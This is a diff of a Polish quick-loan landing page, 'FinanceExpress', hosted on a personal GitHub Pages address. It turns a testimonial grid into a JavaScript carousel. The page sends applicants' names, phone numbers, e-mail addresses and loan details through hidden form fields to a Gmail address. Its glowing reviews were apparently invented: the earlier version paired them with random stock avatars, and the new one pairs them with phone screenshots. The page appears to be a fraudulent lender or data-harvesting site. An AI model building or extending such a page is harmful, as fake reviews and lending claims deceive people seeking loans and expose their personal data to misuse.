@@ -10,6 +10,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Plus+Jakarta+Sans:wght@700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
+        /* --- RESZTA STYLÓW BEZ ZMIAN (przestrzeń) --- */
         :root {
             --primary: #0f172a;
             --primary-light: #1e293b;
@@ -109,13 +110,81 @@
         .feature-card:hover { transform: translateY(-10px); background: #334155; }
         .feature-icon { font-size: 2.5rem; color: var(--secondary); margin-bottom: 20px; }
         .feature-card h3 { font-size: 1.3rem; margin-bottom: 12px; }
-        .testimonials-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 30px; }
-        .testimonial-card { background: var(--gray-100); padding: 30px; border-radius: var(--radius-2xl); border: 1px solid var(--gray-200); }
-        .testimonial-header { display: flex; align-items: center; margin-bottom: 20px; }
-        .testimonial-avatar { width: 50px; height: 50px; border-radius: 50%; margin-right: 15px; object-fit: cover; }
-        .testimonial-author { font-weight: 700; }
-        .testimonial-author span { display: block; font-weight: 400; font-size: 0.9rem; color: var(--gray-500); }
-        .testimonial-stars { color: var(--secondary); margin-bottom: 15px; }
+        /* --- KARUZELA OPINII (NOWA SEKCJA) --- */
+        .testimonials-slider {
+            position: relative;
+            max-width: 800px;
+            margin: 0 auto;
+            overflow: hidden;
+        }
+        .testimonial-slide {
+            display: none;
+            animation: fadeIn 0.8s ease;
+            background: var(--gray-100);
+            padding: 30px;
+            border-radius: var(--radius-2xl);
+            border: 1px solid var(--gray-200);
+        }
+        .testimonial-slide.active {
+            display: block;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .testimonial-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .testimonial-avatar {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            margin-right: 15px;
+            object-fit: cover;
+            border: 2px solid var(--secondary);
+        }
+        .testimonial-author {
+            font-weight: 700;
+        }
+        .testimonial-author span {
+            display: block;
+            font-weight: 400;
+            font-size: 0.9rem;
+            color: var(--gray-500);
+        }
+        .testimonial-stars {
+            color: var(--secondary);
+            margin-bottom: 15px;
+        }
+        .testimonial-text {
+            color: var(--gray-700);
+            font-size: 1rem;
+            line-height: 1.6;
+        }
+        .dots-container {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .dot {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: var(--gray-300);
+            margin: 0 6px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .dot.active {
+            background: var(--secondary);
+            transform: scale(1.2);
+        }
+        .dot:hover {
+            background: var(--secondary);
+        }
+        /* --- RESZTA STYLÓW (FAQ, FOOTER) BEZ ZMIAN --- */
         .proof-section { background-color: var(--gray-100); }
         .proof-images { display: grid; grid-template-columns: 1fr 1fr; gap: 25px; margin-top: 40px; }
         .proof-images img { width: 100%; border-radius: var(--radius-xl); box-shadow: var(--shadow-lg); border: 1px solid var(--gray-200); }
@@ -136,10 +205,11 @@
         .footer-col a:hover { color: var(--secondary); }
         .footer-bottom { border-top: 1px solid #334155; padding-top: 30px; text-align: center; font-size: 0.9rem; }
         @media (max-width: 992px) {
-            .hero-container, .steps-grid, .features-grid, .testimonials-grid, .footer-grid, .proof-images { grid-template-columns: 1fr; }
+            .hero-container, .steps-grid, .features-grid, .footer-grid, .proof-images { grid-template-columns: 1fr; }
             .hero { text-align: center; }
             .hero-subtitle { margin: 0 auto 40px; }
             .trust-badges { justify-content: center; }
+            .testimonials-slider { max-width: 100%; }
         }
         @media (max-width: 768px) {
             .nav-menu { position: fixed; left: -100%; top: 80px; flex-direction: column; background-color: var(--white); width: 100%; text-align: center; transition: 0.3s; box-shadow: var(--shadow-lg); gap: 0; }
@@ -153,10 +223,12 @@
             .section-title { font-size: 2.2rem; }
             .form-grid { grid-template-columns: 1fr; }
             .logo-img-right { display: none; }
+            .testimonial-avatar { width: 50px; height: 50px; }
         }
     </style>
 </head>
 <body>
+    <!-- HEADER (BEZ ZMIAN) -->
     <header class="header" id="header">
         <div class="container">
             <nav class="navbar">
@@ -184,6 +256,7 @@
     </header>
 
     <main>
+        <!-- HERO (BEZ ZMIAN) -->
         <section class="hero" id="wniosek">
             <div class="container hero-container">
                 <div class="hero-content">
@@ -204,7 +277,6 @@
                         <input type="hidden" name="to_email" value="noreply.kontakt.pl@gmail.com">
                         <input type="hidden" name="subject" value="NOWY WNIOSEK - FinanceExpress">
                         <input type="hidden" name="redirect" value="https://monika-sourc.github.io/Szybka-po-yczka-prywatna/dziekuje.html">
-                        
                         <div class="form-grid">
                             <div class="form-group">
                                 <label>Imię *</label>
@@ -215,7 +287,6 @@
                                 <input type="text" name="Nazwisko" required placeholder="Kowalski">
                             </div>
                         </div>
-                        
                         <div class="form-grid">
                             <div class="form-group">
                                 <label>E-mail *</label>
@@ -226,7 +297,6 @@
                                 <input type="tel" name="Telefon" required placeholder="+48 500 600 700">
                             </div>
                         </div>
-                        
                         <div class="form-grid">
                             <div class="form-group">
                                 <label>Kwota pożyczki (zł) *</label>
@@ -245,7 +315,6 @@
                                 </select>
                             </div>
                         </div>
-                        
                         <div class="form-group">
                             <label>Rodzaj pożyczki *</label>
                             <select name="Rodzaj pożyczki" required>
@@ -256,19 +325,16 @@
                                 <option>Pożyczka firmowa</option>
                             </select>
                         </div>
-                        
                         <div class="form-group">
                             <label>Cel pożyczki</label>
                             <textarea name="Cel pożyczki" rows="3" placeholder="Np. remont, wakacje..."></textarea>
                         </div>
-                        
                         <div class="form-group">
                             <label style="display:flex; align-items:start; gap:10px; font-weight:400; font-size:0.9rem;">
                                 <input type="checkbox" name="Zgoda RODO" value="Tak" required style="width:auto; margin-top:3px;">
                                 <span>Akceptuję regulamin i wyrażam zgodę na przetwarzanie danych osobowych. *</span>
                             </label>
                         </div>
-                        
                         <button type="submit" class="btn-submit btn btn-primary btn-lg">
                             <i class="fas fa-paper-plane"></i> Wyślij wniosek
                         </button>
@@ -277,6 +343,7 @@
             </div>
         </section>
 
+        <!-- JAK TO DZIAŁA (BEZ ZMIAN) -->
         <section id="jak-to-dziala">
             <div class="container">
                 <div class="section-header">
@@ -303,6 +370,7 @@
             </div>
         </section>
 
+        <!-- DLACZEGO MY (BEZ ZMIAN) -->
         <section class="features" id="dlaczego-my">
             <div class="container">
                 <div class="section-header">
@@ -329,40 +397,21 @@
             </div>
         </section>
 
+        <!-- OPINIE – NOWA KARUZELA Z 4 OBRAZAMI -->
         <section id="opinie">
             <div class="container">
                 <div class="section-header">
                     <h2 class="section-title">Co mówią nasi klienci</h2>
                     <p class="section-subtitle">Zaufały nam już tysiące Polaków w całej Polsce.</p>
                 </div>
-                <div class="testimonials-grid">
-                    <div class="testimonial-card">
-                        <div class="testimonial-header">
-                            <img src="https://i.pravatar.cc/50?img=1" alt="Anna" class="testimonial-avatar">
-                            <div>
-                                <div class="testimonial-author">Anna K. <span>Warszawa</span></div>
-                            </div>
-                        </div>
-                        <div class="testimonial-stars">
-                            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
-                        </div>
-                        <p>"Nie wierzyłam, że to takie proste! Pieniądze na remont łazienki miałam na koncie następnego dnia. Polecam w 100%!"</p>
-                    </div>
-                    <div class="testimonial-card">
-                        <div class="testimonial-header">
-                            <img src="https://i.pravatar.cc/50?img=3" alt="Piotr" class="testimonial-avatar">
-                            <div>
-                                <div class="testimonial-author">Piotr W. <span>Kraków</span></div>
-                            </div>
-                        <div class="testimonial-stars">
-                            <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
-                        </div>
-                        <p>"Profesjonalna obsługa i bardzo jasne warunki umowy. Zero ukrytych kosztów. W końcu firma, której można zaufać."</p>
-                    </div>
+                <div class="testimonials-slider" id="testimonialSlider">
+                    <!-- Slajdy będą generowane przez JavaScript -->
                 </div>
+                <div class="dots-container" id="dotsContainer"></div>
             </div>
         </section>
 
+        <!-- PRZELEWY (BEZ ZMIAN) -->
         <section class="proof-section">
             <div class="container">
                 <div class="section-header">
@@ -376,6 +425,7 @@
             </div>
         </section>
 
+        <!-- FAQ (BEZ ZMIAN) -->
         <section class="faq" id="faq">
             <div class="container faq-container">
                 <div class="section-header">
@@ -412,6 +462,7 @@
         </section>
     </main>
 
+    <!-- FOOTER (BEZ ZMIAN) -->
     <footer class="footer">
         <div class="container">
             <div class="footer-grid">
@@ -443,6 +494,7 @@
                         <li><a href="tel:+48123456789"></a></li>
                     </ul>
                 </div>
+            </div>
             <div class="footer-bottom">
                 <p>&copy; 2026 FinanceExpress. Wszelkie prawa zastrzeżone.</p>
             </div>
@@ -450,6 +502,7 @@
     </footer>
 
     <script>
+        // --- MENU BURGER (BEZ ZMIAN) ---
         const hamburger = document.querySelector(".hamburger");
         const navMenu = document.querySelector(".nav-menu");
         hamburger.addEventListener("click", () => {
@@ -460,6 +513,8 @@
             hamburger.classList.remove("active");
             navMenu.classList.remove("active");
         }));
+
+        // --- FAQ (BEZ ZMIAN) ---
         const faqItems = document.querySelectorAll(".faq-item");
         faqItems.forEach(item => {
             const question = item.querySelector(".faq-question");
@@ -471,6 +526,102 @@
                 item.classList.toggle("active");
             });
         });
+
+        // --- KARUZELA OPINII (NOWY SKRYPT) ---
+        const clients = [
+            {
+                img: 'Screenshot_20260622-032548~2.png',
+                name: 'Anna K.',
+                city: 'Warszawa',
+                text: 'Nie wierzyłam, że to takie proste! Pieniądze na remont łazienki miałam na koncie następnego dnia. Polecam w 100%!'
+            },
+            {
+                img: 'Screenshot_20260622-032155~2.png',
+                name: 'Piotr W.',
+                city: 'Kraków',
+                text: 'Profesjonalna obsługa i bardzo jasne warunki umowy. Zero ukrytych kosztów. W końcu firma, której można zaufać.'
+            },
+            {
+                img: 'Screenshot_20260622-031125~2.png',
+                name: 'Maria P.',
+                city: 'Gdańsk',
+                text: 'Szybka decyzja i pieniądze na koncie w kilka godzin. Naprawdę polecam każdemu, kto potrzebuje gotówki od ręki.'
+            },
+            {
+                img: 'Screenshot_20260622-031917~2.png',
+                name: 'Janusz S.',
+                city: 'Wrocław',
+                text: 'Pierwszy raz skorzystałem z pożyczki online i nie zawiodłem się. Wszystko jasne, przejrzyste i bez zbędnych formalności.'
+            }
+        ];
+
+        let currentIndex = 0;
+        const slider = document.getElementById('testimonialSlider');
+        const dotsContainer = document.getElementById('dotsContainer');
+        let intervalId;
+
+        function renderSlides() {
+            slider.innerHTML = '';
+            clients.forEach((client, index) => {
+                const slide = document.createElement('div');
+                slide.className = `testimonial-slide ${index === 0 ? 'active' : ''}`;
+                slide.innerHTML = `
+                    <div class="testimonial-header">
+                        <img src="${client.img}" alt="${client.name}" class="testimonial-avatar">
+                        <div>
+                            <div class="testimonial-author">${client.name} <span>${client.city}</span></div>
+                        </div>
+                    </div>
+                    <div class="testimonial-stars">
+                        <i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>
+                    </div>
+                    <div class="testimonial-text">"${client.text}"</div>
+                `;
+                slider.appendChild(slide);
+            });
+        }
+
+        function renderDots() {
+            dotsContainer.innerHTML = '';
+            clients.forEach((_, index) => {
+                const dot = document.createElement('span');
+                dot.className = `dot ${index === 0 ? 'active' : ''}`;
+                dot.dataset.index = index;
+                dot.addEventListener('click', () => {
+                    goToSlide(index);
+                    resetInterval();
+                });
+                dotsContainer.appendChild(dot);
+            });
+        }
+
+        function goToSlide(index) {
+            const slides = slider.querySelectorAll('.testimonial-slide');
+            const dots = dotsContainer.querySelectorAll('.dot');
+            if (index < 0) index = slides.length - 1;
+            if (index >= slides.length) index = 0;
+            slides.forEach((slide, i) => {
+                slide.classList.toggle('active', i === index);
+            });
+            dots.forEach((dot, i) => {
+                dot.classList.toggle('active', i === index);
+            });
+            currentIndex = index;
+        }
+
+        function nextSlide() {
+            goToSlide(currentIndex + 1);
+        }
+
+        function resetInterval() {
+            clearInterval(intervalId);
+            intervalId = setInterval(nextSlide, 60000); // 60 000 ms = 1 minuta
+        }
+
+        // Inicjalizacja
+        renderSlides();
+        renderDots();
+        intervalId = setInterval(nextSlide, 60000); // start automatycznej zmiany co minutę
     </script>
 </body>
 </html>
